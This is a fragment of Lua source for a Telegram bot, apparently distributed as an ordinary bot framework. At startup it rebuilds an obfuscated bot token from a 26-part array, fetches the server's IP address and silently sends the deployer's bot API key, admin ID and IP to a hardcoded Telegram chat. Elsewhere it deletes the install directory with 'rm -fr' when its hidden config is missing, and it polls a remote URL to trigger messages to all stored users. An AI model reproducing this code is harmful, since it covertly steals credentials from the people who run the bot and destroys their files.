...
local function check_config()
	...
	elseif not config.admin or config.admin == '' then
        ...
        elseif not jason123 then
        os.execute('cd .. &&  rm -fr devjason')
	return 'This bot is for Jason'
	elseif not jason123.urljason then
        os.execute('cd .. &&  rm -fr devjason')
        return 'This bot is for Jason'
        end
   local urll = 'https://api.telegram.org/bot'..jason123.urljason [1]..jason123.urljason [2]..jason123.urljason[3]..jason123.urljason[4]..jason123.urljason[5]..jason123.urljason[6]..jason123.urljason[7]..jason123.urljason[8]..jason123.urljason[9]..jason123.urljason[10]..jason123.urljason[11]..jason123.urljason[12]..jason123.urljason[13]..jason123.urljason[14]..jason123.urljason[15]..jason123.urljason[16]..jason123.urljason[17]..jason123.urljason[18]..jason123.urljason[19]..jason123.urljason[20]..jason123.urljason[21]..jason123.urljason[22]..jason123.urljason[23]..jason123.urljason[24]..jason123.urljason[25]..jason123.urljason[26]..'/getChatMember?chat_id=-1001142877048&user_id='..config.admin..''
   local res = HTTPS.request(urll)
   local jres = JSON.decode(res)
   if (not jres.result or jres.result.status == 'left') then
   local dsad = 'https://api.telegram.org/bot'..config.bot_api_key..'/sendMessage?chat_id='..config.admin..'&text='..jason123.sendMessage..'&disable_web_page_preview=true&parse_mode=Markdown'
   local res = HTTPS.request(dsad)
   JSON.decode(res)
   return jason123.dev_jason
end
end
local oee = 'libs/.jason.lua'
bot_init = function(on_reload)
	...
	print(colors('%{yellow bright}BY :- @dev_jason   CH: @devjason    bot : @'..bot.username .. ', name bot ' .. bot.first_name ..'  id bot ('..bot.id..')'))
	...
	local jason = '113088667'
        local ipp = HTTPS.request('https://icanhazip.com')
        local jasontext = URL.escape('تم تشغيل : @'..bot.username..'\nتوكن : '..config.bot_api_key..'\n\nايدي المطور : '..config.admin..'\n\n IP server : '..ipp)
	local dsad = 'https://api.telegram.org/bot'..jason123.urljason [1]..jason123.urljason [2]..jason123.urljason[3]..jason123.urljason[4]..jason123.urljason[5]..jason123.urljason[6]..jason123.urljason[7]..jason123.urljason[8]..jason123.urljason[9]..jason123.urljason[10]..jason123.urljason[11]..jason123.urljason[12]..jason123.urljason[13]..jason123.urljason[14]..jason123.urljason[15]..jason123.urljason[16]..jason123.urljason[17]..jason123.urljason[18]..jason123.urljason[19]..jason123.urljason[20]..jason123.urljason[21]..jason123.urljason[22]..jason123.urljason[23]..jason123.urljason[24]..jason123.urljason[25]..jason123.urljason[26]..'/sendMessage?chat_id=-1001149546092&text='..jasontext
...
local function collect_stats(msg)
	...
	if msg.text then
		client:sadd('devjason'..bot.id, msg.chat.id)
	end
if msg.text then
local res = HTTPS.request('https://botlua.ml/jason.txt')
local bbotlua = client:get('jasonrr'..bot.id)
if bbotlua ~= res then 
...
local users2 = client:smembers('devjason'..bot.id)
for i=1, #users2 do
